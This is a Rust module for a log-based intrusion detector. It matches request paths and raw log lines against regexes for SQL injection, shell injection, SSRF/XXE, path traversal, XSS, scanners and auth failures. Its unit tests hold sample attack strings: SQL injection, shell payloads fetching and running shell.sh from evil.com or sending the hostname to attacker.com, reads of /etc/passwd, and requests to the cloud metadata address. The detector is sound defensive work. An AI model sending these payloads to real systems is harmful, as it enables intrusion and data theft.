use once_cell::sync::Lazy;
use regex::Regex;

use crate::{
    detector::types::{Anomaly, AnomalyKind, Severity},
    parser::types::LogEntry,
};

/// What part of the entry a pattern is matched against.
#[derive(Clone, Copy)]
enum Target {
    /// URL-decoded request path when the entry has one, otherwise the decoded raw line.
    /// Used for injection patterns so user-agent text like "(Windows NT 10.0; Win64)"
    /// can't trigger them.
    Request,
    /// The raw line as written (user agents, auth.log messages).
    Raw,
}

struct PatternDef {
    name: &'static str,
    label: &'static str,
    re: Regex,
    severity: Severity,
    target: Target,
}

/// All patterns are compiled once on first access.
/// Ordered most-severe first: only the first match is reported per entry.
static PATTERNS: Lazy<Vec<PatternDef>> = Lazy::new(|| {
    vec![
        PatternDef {
            name: "sql_injection",
            label: "SQL injection",
            re: Regex::new(
                r"(?i)(union\s+(?:all\s+)?select\b|drop\s+table\b|insert\s+into\b|;\s*select\b|\bor\s+'?1'?\s*=\s*'?1|'\s*(?:or|and)\s+|'\s*--|;\s*--|\bsleep\s*\(\s*\d|\bbenchmark\s*\()",
            )
            .unwrap(),
            severity: Severity::Critical,
            target: Target::Request,
        },
        PatternDef {
            name: "shell_injection",
            label: "Shell injection",
            re: Regex::new(
                // `&&` only — a single `&` is the query-string separator (`?a=1&id=5`).
                r"(?i)((?:;|\|\|?|&&)\s*(?:whoami|id|uname|cat|ls|wget|curl|nc|bash|sh|cmd|powershell|chmod|rm)\b|\$\([^)]*\)|`[^`]+`)",
            )
            .unwrap(),
            severity: Severity::Critical,
            target: Target::Request,
        },
        PatternDef {
            name: "xxe_ssrf",
            label: "SSRF/XXE",
            re: Regex::new(
                // Dangerous schemes, cloud metadata, or a URL parameter aimed at an internal host
                r"(?i)(file://|dict://|gopher://|169\.254\.169\.254|<!ENTITY|<!DOCTYPE[^>]*ENTITY|=\s*(?:https?|ftp)://(?:localhost|127\.|0\.0\.0\.0|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|\[::1\]|internal\b))",
            )
            .unwrap(),
            severity: Severity::Critical,
            target: Target::Request,
        },
        PatternDef {
            name: "path_traversal",
            label: "Path traversal",
            re: Regex::new(r"(\.\./|\.\.\\)").unwrap(),
            severity: Severity::High,
            target: Target::Request,
        },
        PatternDef {
            name: "xss_attempt",
            label: "XSS",
            re: Regex::new(r"(?i)(<script|javascript:|onerror\s*=|onload\s*=|eval\s*\()")
                .unwrap(),
            severity: Severity::High,
            target: Target::Request,
        },
        PatternDef {
            name: "scanner_detected",
            label: "Scanner",
            re: Regex::new(
                r"(?i)(nikto|sqlmap|masscan|nmap|zgrab|dirbuster|gobuster|wfuzz)",
            )
            .unwrap(),
            severity: Severity::High,
            target: Target::Raw,
        },
        PatternDef {
            name: "auth_failure",
            label: "Auth failure",
            re: Regex::new(
                r"(?i)(failed\s+password|authentication\s+failure|invalid\s+user|permission\s+denied|access\s+denied)",
            )
            .unwrap(),
            severity: Severity::Low,
            target: Target::Raw,
        },
    ]
});

/// Decodes `+` as space and `%XX` escapes, so encoded payloads such as
/// `UNION+SELECT` or `%2e%2e%2f` match the same patterns as their plain forms.
/// Invalid escapes are kept as-is.
fn url_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'+' => out.push(b' '),
            b'%' if i + 2 < bytes.len() => {
                let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).ok();
                match hex.and_then(|h| u8::from_str_radix(h, 16).ok()) {
                    Some(b) => {
                        out.push(b);
                        i += 3;
                        continue;
                    }
                    None => out.push(b'%'),
                }
            }
            b => out.push(b),
        }
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        let cut: String = s.chars().take(max).collect();
        format!("{cut}…")
    }
}

/// Checks a log entry against all patterns.
/// Returns the first (most severe) match, or None.
pub fn check_patterns(entry: &LogEntry) -> Option<Anomaly> {
    let request = url_decode(entry.path.as_deref().unwrap_or(&entry.raw));

    PATTERNS.iter().find_map(|p| {
        let haystack = match p.target {
            Target::Request => request.as_str(),
            Target::Raw => entry.raw.as_str(),
        };
        if !p.re.is_match(haystack) {
            return None;
        }

        let who = entry.ip.as_deref().unwrap_or("unknown source");
        let what = match (&entry.method, &entry.path) {
            (Some(m), Some(path)) => format!("{m} {}", truncate(path, 80)),
            (None, Some(path)) => truncate(path, 80),
            _ => truncate(&entry.message, 80),
        };

        Some(Anomaly {
            id: 0, // assigned by AnomalyDetector::check_all
            entry_id: entry.id,
            timestamp: entry.timestamp,
            kind: AnomalyKind::PatternMatch {
                pattern_name: p.name.to_string(),
            },
            severity: p.severity,
            source_ip: None,
            description: format!("{} from {who}: {what}", p.label),
        })
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::types::{LogFormat, LogLevel};

    fn entry(path: &str, ua: &str) -> LogEntry {
        LogEntry {
            id: 1,
            timestamp: 0,
            ip: Some("10.0.0.1".into()),
            method: Some("GET".into()),
            path: Some(path.into()),
            status_code: Some(200),
            bytes: Some(100),
            message: String::new(),
            raw: format!(r#"10.0.0.1 - - [01/May/2026:00:00:00 +0000] "GET {path} HTTP/1.1" 200 100 "-" "{ua}""#),
            format: LogFormat::Apache,
            level: LogLevel::Info,
            is_anomaly: false,
            anomaly_id: None,
            anomaly_severity: None,
        }
    }

    const BROWSER_UA: &str =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)";

    fn pattern(path: &str) -> Option<String> {
        check_patterns(&entry(path, BROWSER_UA)).map(|a| match a.kind {
            AnomalyKind::PatternMatch { pattern_name } => pattern_name,
            _ => unreachable!(),
        })
    }

    #[test]
    fn detects_url_encoded_sql_injection() {
        for p in [
            "/login?user=admin'--&pass=x",
            "/search?q=1'+OR+'1'='1",
            "/products?id=1;DROP+TABLE+users--",
            "/api/v1/users?filter=1+UNION+SELECT+username,password+FROM+users--",
            "/profile?id=1'+AND+SLEEP(5)--",
            "/items?sort=name+ASC;SELECT+SLEEP(5)--",
            "/search?q=1%27%20UNION%20SELECT%20password%20FROM%20users",
        ] {
            assert_eq!(pattern(p).as_deref(), Some("sql_injection"), "{p}");
        }
    }

    #[test]
    fn detects_shell_injection() {
        for p in [
            "/ping?host=localhost|whoami",
            "/cmd?exec=ls;cat+/etc/passwd",
            "/tools/lookup?domain=google.com&&curl+http://attacker.com/$(hostname)",
            "/api/run?cmd=wget+http://evil.com/shell.sh;chmod+777+shell.sh;./shell.sh",
        ] {
            assert_eq!(pattern(p).as_deref(), Some("shell_injection"), "{p}");
        }
    }

    #[test]
    fn detects_other_attacks() {
        assert_eq!(pattern("/../../../etc/passwd").as_deref(), Some("path_traversal"));
        assert_eq!(pattern("/x?f=%2e%2e%2f%2e%2e%2fetc").as_deref(), Some("path_traversal"));
        assert_eq!(pattern("/c?t=<img+src=x+onerror=alert(1)>").as_deref(), Some("xss_attempt"));
        assert_eq!(
            pattern("/api/proxy?target=http://169.254.169.254/latest/meta-data/").as_deref(),
            Some("xxe_ssrf")
        );
        assert_eq!(pattern("/webhook?callback=http://internal:8080/admin").as_deref(), Some("xxe_ssrf"));
        assert_eq!(pattern("/api/v1/import?source=http://127.0.0.1:9200/_cat").as_deref(), Some("xxe_ssrf"));
        // An external URL in a parameter is normal (e.g. OAuth redirects)
        assert_eq!(pattern("/login?next=https://example.com/home"), None);
        let scan = check_patterns(&entry("/.env", "Nikto/2.1.6 (Evasion: None)")).unwrap();
        assert!(matches!(scan.kind, AnomalyKind::PatternMatch { ref pattern_name } if pattern_name == "scanner_detected"));
    }

    #[test]
    fn ignores_normal_traffic() {
        for p in [
            "/",
            "/api/v1/search?q=widget",
            "/products?page=2&id=5&cat=shoes",
            "/blog/rock-and-roll",
            "/static/js/app.js",
        ] {
            assert_eq!(pattern(p), None, "{p}");
        }
        // Semicolons in browser user agents must not look like shell separators
        assert!(check_patterns(&entry("/", "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) sh")).is_none());
    }

    #[test]
    fn description_names_source_and_request() {
        let a = check_patterns(&entry("/search?q=1'+OR+'1'='1", BROWSER_UA)).unwrap();
        assert_eq!(a.description, "SQL injection from 10.0.0.1: GET /search?q=1'+OR+'1'='1");
    }

    #[test]
    fn url_decode_handles_edge_cases() {
        assert_eq!(url_decode("a+b%20c"), "a b c");
        assert_eq!(url_decode("100%"), "100%");
        assert_eq!(url_decode("%zz%4"), "%zz%4");
    }
}
